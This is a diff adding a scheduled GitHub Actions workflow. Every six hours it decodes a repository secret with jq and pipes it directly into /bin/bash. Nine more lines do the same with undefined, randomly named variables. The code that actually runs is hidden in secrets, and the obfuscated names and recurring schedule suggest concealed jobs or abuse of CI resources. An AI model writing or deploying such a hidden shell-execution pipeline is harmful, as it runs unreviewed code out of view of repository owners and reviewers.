@@ -1,0 +1,26 @@
+name: daguoyixiewangye
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: daguoyixiewangye
+        env:
+          np7578: ${{ secrets.np7578 }}
+        run: |
+          echo $np7578 | jq -r .q0266 | /bin/bash
+          echo $mrhe8 | jq -r .o01092 | /bin/bash
+          echo $sfoe2 | jq -r .fw3 | /bin/bash
+          echo $c3609 | jq -r .nduwh7 | /bin/bash
+          echo $owb98 | jq -r .azda887 | /bin/bash
+          echo $j119 | jq -r .ubmn4598 | /bin/bash
+          echo $g42 | jq -r .wnxyo6 | /bin/bash
+          echo $wvsl23292 | jq -r .znbms576 | /bin/bash
+          echo $mrdmi045 | jq -r .xxy475 | /bin/bash
+          echo $yx84 | jq -r .fe856 | /bin/bash
+
